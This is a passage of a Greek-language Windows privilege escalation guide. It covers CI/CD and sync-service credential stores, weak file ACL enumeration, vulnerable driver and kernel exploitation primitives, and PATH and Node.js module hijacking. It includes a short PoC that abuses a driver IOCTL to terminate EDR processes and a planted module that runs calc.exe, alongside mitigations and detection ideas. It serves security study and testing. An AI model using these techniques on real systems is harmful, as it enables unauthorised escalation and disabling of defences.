Σε έναν Windows Jenkins controller, διακρίνετε το δικαίωμα δημιουργίας ή ρύθμισης μιας εργασίας από το δικαίωμα εκκίνησής της: [η τεκμηρίωση του Jenkins τα ορίζει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο χρονοδιάγραμμα ή ένα απομακρυσμένο trigger μπορεί να προσφέρει άλλη διαδρομή εκτέλεσης build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο διαπιστευτήριο μπορεί να χρησιμοποιηθεί μόνο αν η εργασία έχει πρόσβαση στο scope του. Εξετάστε ξεχωριστά την πρόσβαση στα μεταδεδομένα του `JENKINS_HOME`: το Jenkins διατηρεί υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών του Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επαληθεύστε **την πρόσβαση ανάγνωσης στα απαιτούμενα αρχεία** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εμφανίζετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` του αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένη διεργασία που την καταναλώνει και εκτελείται ως ο χρήστης-στόχος, πριν τη θεωρήσετε εκτέλεση μεταξύ χρηστών. Για περαιτέρω έλεγχο ομάδων απαιτείται ξεχωριστή επαλήθευση των αποτελεσματικών δικαιωμάτων AD.

#### Ταυτότητα agent αυτοφιλοξενούμενου Azure Pipelines

Για ένα έργο Azure DevOps Server ή Azure Pipelines, διαχωρίστε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **τοποθέτησης στην ουρά** του και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ξεχωριστά τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει αυτό το pipeline σε αυτοφιλοξενούμενο Windows agent, το βήμα εκτελείται ως ο [ρυθμισμένος λογαριασμός λειτουργικού συστήματος του agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επαληθεύστε το ακριβές pipeline, τους περιορισμούς branch/resource, το εξουσιοδοτημένο pool, την εκτελέσιμη εργασία και την ταυτότητα της υπηρεσίας agent, πριν ισχυριστείτε ότι υπάρχει μετάβαση μεταξύ χρηστών ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος έργου ή δικαίωμα εγγραφής στο repository αποτελούν μόνο ενδείξεις προς διερεύνηση· εξετάστε τα δικαιώματα και τα τοπικά μεταδεδομένα της υπηρεσίας χωρίς να εκκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και αποκτά πρόσβαση στη βάση δεδομένων SQL, από τον **λογαριασμό σύνδεσης AD DS**, του οποίου τα δικαιώματα στον κατάλογο εξαρτώνται από τις ρυθμισμένες λειτουργίες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτή τη βάση δεδομένων, ενώ το υλικό κλειδιού [προστατεύεται μέσω DPAPI υπό τον λογαριασμό υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα με όνομα που υποδηλώνει τοπικό διαχειριστή ή η απλή ορατότητα της βάσης δεδομένων δεν αποδεικνύουν ότι υπάρχουν αποκρυπτογραφήσιμα διαπιστευτήρια ή δυνατότητα κλιμάκωσης δικαιωμάτων στον τομέα. Εξετάστε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης στη βάση δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στα κλειδιά, τη διάταξη εγκατάστασης και SQL, την ταυτότητα σύνδεσης που έχει ρυθμιστεί και τα αποτελεσματικά δικαιώματα AD αυτής της ταυτότητας. Η τακτική απαρίθμηση πρέπει να εμφανίζει μόνο μεταδεδομένα υπηρεσίας και πρόσβασης, όχι να πραγματοποιεί ερωτήματα ή να εκτυπώνει αποθηκευμένα μυστικά.

#### Δικαιώματα DLL υποστήριξης προγραμμάτων οδήγησης εκτυπωτή

Ένα εγκατεστημένο πρόγραμμα οδήγησης εκτυπωτή μπορεί να διατηρεί DLL υποστήριξης κάτω από το `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με υψηλότερα δικαιώματα. Εξετάστε τα ACL του ακριβούς καταλόγου του προγράμματος οδήγησης και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση WMI εκτυπωτών. Για το [ζήτημα προγράμματος οδήγησης εκτυπωτή Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· η [αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει τη φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα εγγράψιμο ACL αποτελεί μόνο ένδειξη προς διερεύνηση: επαληθεύστε την αποτελεσματική πρόσβαση εγγραφής αφού ληφθούν υπόψη οι καταχωρίσεις άρνησης, ότι έχει εγκατασταθεί το σχετικό πρόγραμμα οδήγησης και ότι φορτώνει το αρχείο υπό ταυτότητα με αυξημένα δικαιώματα, καθώς και αν ο προμηθευτής έχει διορθώσει την εγκατάσταση με ενημερωμένο πρόγραμμα οδήγησης ή πρόγραμμα ασφαλείας. Μην συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του προγράμματος οδήγησης.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων ώστε να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο δυαδικό αρχείο που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος να εντοπίσετε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να εκτελέσετε:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/εκτέλεση μέσω αυτόματης φόρτωσης plugin στο Notepad++

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable/αντίγραφο με δικαίωμα εγγραφής, η τοποθέτηση ενός κακόβουλου plugin εξασφαλίζει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks του plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry key ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα αυθαίρετο primitive ανάγνωσης/εγγραφής kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε τα προνόμια κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη kernel.<sup>[[13]](#references)</sup> Δείτε εδώ την τεχνική βήμα προς βήμα:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Σχετικό υλικό για εκμετάλλευση του Windows kernel:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Για bugs τύπου race condition, όπου η ευάλωτη κλήση ανοίγει μια διαδρομή Object Manager που ελέγχεται από τον attacker, η σκόπιμη επιβράδυνση της αναζήτησης (με χρήση components μέγιστου μήκους ή βαθιών αλυσίδων καταλόγων) μπορεί να διευρύνει το χρονικό περιθώριο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF σε cancel-safe queue, διαρροές paged-pool και pivots σε I/O ring

Ορισμένες αλυσίδες Windows kernel LPE μπορούν να βασιστούν σε δύο bugs που είναι μεμονωμένα αδύναμα: ένα **race στη διάρκεια ζωής cancel-safe queue** που αποδεσμεύει ένα request/CBD ενώ το lock της queue είναι ακόμη κλειδωμένο, και μια διαρροή **lock-release-before-copy** που διαρρέει μια αποδεσμευμένη κατανομή paged-pool κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για audit και εκμετάλλευση:

- **Free-under-lock + cancel afterwards**: αναζητήστε ένα success path που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ το cancel path εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν το success path φτάσει στο `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν απελευθερώσει το lock CBDQ/CSQ, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί αργότερα να συνεχίσει και να περάσει ένα αποδεσμευμένο `PFLT_CALLBACK_DATA` πίσω στο callback αφαίρεσης του driver.
- **Ανακτήστε το αποδεσμευμένο αντικείμενο queue** με μια κατανομή paged-pool ίδιου μεγέθους, ελεγχόμενη από τον attacker. Οι καταχωρίσεις Data Queue Entries του `NPFS` είναι χρήσιμες, επειδή το payload και το μέγεθος ελέγχονται, ενώ μπορείτε αργότερα να τις εξετάσετε με λειτουργίες ανάγνωσης/peek pipe. Αν το αποδεσμευμένο αντικείμενο ενσωματώνει συνδέσμους λίστας, αντικαταστήστε τους με μια **κυκλική λίστα από fake request nodes στη user memory**, ώστε ο driver να επεξεργάζεται επανειλημμένα δομές request που ορίζει ο attacker αντί να τερματίζει στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε ένα προβλέψιμο write**: αν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται από bookkeeping writes (timestamps / QPC / πεδία παρακείμενα σε refcount), ενδέχεται να αποκτήσετε ένα **write ελεγχόμενης διεύθυνσης, αλλά όχι ελεγχόμενης τιμής**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **length/size** ενός αντικειμένου sprayed pool αντί για έναν τελικό pointer κώδικα/δεδομένων και, στη συνέχεια, εξετάστε διαδοχικά το spray μέχρι το αλλοιωμένο αντικείμενο να επιτρέψει ανάγνωση paged-pool εκτός ορίων.
- **Μοτίβο διαρροής που μπορεί να εκμεταλλευτεί race**: κάθε syscall που εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία αυξάνεται όταν ο attacker μπορεί να μεγαλώσει το buffer που αντιγράφεται (για παράδειγμα, προσθέτοντας πολλές καταχωρίσεις λίστας/resource που αυξάνουν το τελικό μέγεθος κατανομής ενός serializer), επειδή η μεγαλύτερη αντιγραφή διευρύνει το χρονικό περιθώριο αντικατάστασης χωρίς απαραίτητα να προκαλεί crash στο μηχάνημα.
- **Στόχοι refill με πολλούς pointers**: οι πίνακες registered-buffer του Windows **I/O ring** είναι εξαιρετικοί στόχοι διαρροής, επειδή το μέγεθος paged-pool τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Διαρρεύστε έναν από αυτούς τους πίνακες, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες λειτουργίες I/O ring να χρησιμοποιούν καταχωρίσεις που έχει κατασκευάσει ο attacker και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή kernel. Αν το μοναδικό διαθέσιμο write σάς δίνει ένα σταθερό byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **επικαλυπτόμενα, μη ευθυγραμμισμένα writes** για να δημιουργήσετε έναν user pointer με επαναλαμβανόμενα bytes, όπως `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον πλαστογραφημένο πίνακα registered-buffer.<sup>[[30]](#references)</sup>

Χρήσιμοι δείκτες για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Αφού αποκτήσετε αυθαίρετο kernel read/write από το αλλοιωμένο I/O ring, κλέψτε ένα SYSTEM token χρησιμοποιώντας την τυπική post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης σε hive του Registry

Οι σύγχρονες ευπάθειες hive σάς επιτρέπουν να προετοιμάζετε deterministic layouts, να εκμεταλλεύεστε εγγράψιμους απογόνους των HKLM/HKU και να μετατρέπετε την αλλοίωση metadata σε kernel paged-pool overflows χωρίς custom driver. Μάθετε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων direct-mode στο `RtlQueryRegistryValues` μέσω διαδρομών που ελέγχει ο attacker

Ορισμένοι drivers δέχονται μια διαδρομή μητρώου από το userland, ελέγχουν μόνο ότι είναι έγκυρη συμβολοσειρά UTF-16 και στη συνέχεια καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` προς μια scalar μεταβλητή της stack, όπως `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** τύπο του μητρώου και όχι σύμφωνα με τον τύπο που περίμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: μια απόλυτη διαδρομή `\Registry\...` που ελέγχεται από τον χρήστη επιτρέπει στον driver να κάνει query σε κλειδιά που επιλέγει ο attacker, να κάνει leak την ύπαρξή τους μέσω return codes/logs και μερικές φορές να διαβάζει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, υπόκειται σε σύγχυση τύπων και αντιμετωπίζεται ως `REG_QWORD`, `UNICODE_STRING` ή buffer binary δεδομένων με μέγεθος, ανάλογα με τον τύπο της τιμής μητρώου.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Μετριασμός στα Windows 8+**: αν το query αφορά ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από kernel προκαλούν crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα εκμετάλλευσης, αναζητήστε **κλειδιά που μπορεί να γράψει ο attacker μέσα σε trusted system hives** αντί να τοποθετείτε τιμές στο `HKCU`.
- **Staging σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε εγγράψιμους απογόνους του `\Registry\Machine` και επαναλάβετε τη σάρωση με duplicated token **low-integrity** για να βρείτε κλειδιά προσβάσιμα από sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό δείκτη callback/συνάρτησης.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας πρώτα φορτώσει ένα `REG_DWORD` ελεγχόμενο από τον attacker σε μια scalar μεταβλητή της στοίβας και μετά επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση string, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον δείκτη `Buffer`, προκαλώντας μια μερικώς ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα binary δεδομένα, η direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή ελεγχόμενη από τον attacker στην επαναχρησιμοποιούμενη scalar μεταβλητή, το επόμενο query `REG_BINARY` αντιγράφει byte του attacker απευθείας σε γειτονικές θέσεις της στοίβας, κάτι που συχνά αποτελεί τον πιο απλό τρόπο για πλήρη αντικατάσταση δείκτη callback.

Ισχυρό μοτίβο για αναζήτηση: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας, χωρίς επανεγκοίτασή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιούμενους δείκτες `EntryContext` και διαδρομές κώδικα όπου η πρώτη ανάγνωση registry καθορίζει αν θα εκτελεστεί δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι υπογεγραμμένοι drivers τρίτων κατασκευαστών δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν γίνεται άνοιγμα του device μέσω διαδρομής που περιέχει επιπλέον στοιχείο, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματική περίπτωση)

Μόλις ένας χρήστης μπορέσει να ανοίξει το device, μπορεί να κάνει κατάχρηση των προνομιούχων IOCTL που εκθέτει ο driver για LPE και παραποίηση. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / shell ως SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή ακατέργαστου δίσκου (παραποίηση offline, τεχνάσματα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας kill του AV/EDR από user land μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Μετριασμοί για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία αντικειμένων συσκευής που προορίζονται να περιορίζονται από DACL.
- Να επικυρώνετε το περιβάλλον του καλούντος για προνομιούχες λειτουργίες. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Να περιορίζετε τα IOCTLs (μάσκες πρόσβασης, METHOD_*, επικύρωση εισόδου) και να εξετάζετε brokered μοντέλα αντί για άμεσα δικαιώματα kernel.

Ιδέες ανίχνευσης για defenders
- Να παρακολουθείτε ανοίγματα από user mode ύποπτων ονομάτων συσκευών (π.χ., \\ .\\amsdk*) και συγκεκριμένων ακολουθιών IOCTL που υποδηλώνουν κατάχρηση.
- Να επιβάλλετε τη vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε τις δικές σας λίστες allow/deny.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής μέσα σε έναν φάκελο που βρίσκεται στο PATH**, ενδέχεται να μπορέσετε να κάνετε hijack ένα DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε τα προνόμιά σας**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με το πώς να κάνετε abuse αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking επίλυσης module Node.js / Electron μέσω του `C:\node_modules`

Πρόκειται για μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node αναζητά packages ανεβαίνοντας στο δέντρο καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, η αναζήτηση μπορεί να φτάσει μέχρι τη ρίζα του drive, οπότε μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` ενδέχεται να ελέγξει τις εξής τοποθεσίες:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά προνόμια** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει εκεί ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει μέχρι μια διεργασία **Node/Electron με υψηλότερα προνόμια** να προσπαθήσει να επιλύσει την ελλείπουσα εξάρτηση. Το payload εκτελείται στο security context της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** όποτε ο στόχος εκτελείται ως administrator, από elevated scheduled task/service wrapper ή από προνομιούχο desktop app που ξεκινά αυτόματα.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια third-party library περικλείει το `require("foo")` σε `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα package αφαιρέθηκε από τα production builds, παραλείφθηκε κατά τη διαδικασία packaging ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί στον κώδικα της κύριας εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με `Process Name` = το εκτελέσιμο αρχείο-στόχο (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελευταίο επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα για code review σε unpacked αρχεία `.asar` ή στον πηγαίο κώδικα της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** μέσω του Procmon ή εξετάζοντας τον πηγαίο κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβές αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και η νόμιμη μονάδα δεν υπάρχει, το Node ενδέχεται να φορτώσει το `C:\node_modules\foo.js`.

Πραγματικά παραδείγματα προαιρετικών μονάδων που λείπουν και ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο στοιχείο: εντοπίστε οποιοδήποτε **missing bare import** το οποίο θα αναζητήσει μια προνομιούχα διεργασία Windows Node/Electron.

### Ιδέες για εντοπισμό και ενίσχυση ασφάλειας

- Ειδοποιήστε όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει νέα αρχεία/πακέτα `.js` εκεί.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στην παραγωγή και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε τον κώδικα τρίτων για μοτίβα σιωπηλής διαχείρισης εξαιρέσεων, όπως `try { require("...") } catch {}`.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους αν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να παραλείψουν τον παλιό έλεγχο `utf-8-validate` με τη μεταβλητή `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Ελέγξτε αν υπάρχουν άλλοι γνωστοί υπολογιστές με στατικές καταχωρίσεις στο αρχείο hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από έξω.

```bash
netstat -ano #Opened ports?
```

